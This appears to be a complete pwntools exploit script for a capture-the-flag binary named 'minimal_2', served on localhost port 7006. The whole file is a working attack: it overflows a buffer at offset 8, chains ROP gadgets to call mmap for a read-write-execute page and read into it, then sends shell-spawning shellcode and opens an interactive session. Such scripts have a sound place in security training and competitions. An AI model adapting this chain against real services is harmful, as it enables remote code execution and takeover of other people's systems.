#!/usr/bin/env python3

from pwn import *

exe = ELF("minimal_2")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"

CHAL = "minimal-2"

p = remote("localhost", 7006)


mmap = list(map(p64, [
    rop.rax[0],
    0x9,
    rop.rdi[0],
    0x10000,
    rop.rsi[0],
    0x1000,
    rop.rdx[0],
    0x7,
    rop.r10[0],
    0x22,
    rop.syscall[0]
]))

read = list(map(p64, [
    rop.rax[0],
    0,
    rop.rdi[0],
    0,
    rop.rsi[0],
    0x10000,
    rop.rdx[0],
    0x1000,
    rop.syscall[0]
]))

payload = flat({
    8: [
        mmap,
        read,
        p64(0x10000)
    ] 
})
p.sendline(payload)
p.sendline(asm(shellcraft.sh()))
# automate inputs as necessary here

p.interactive()
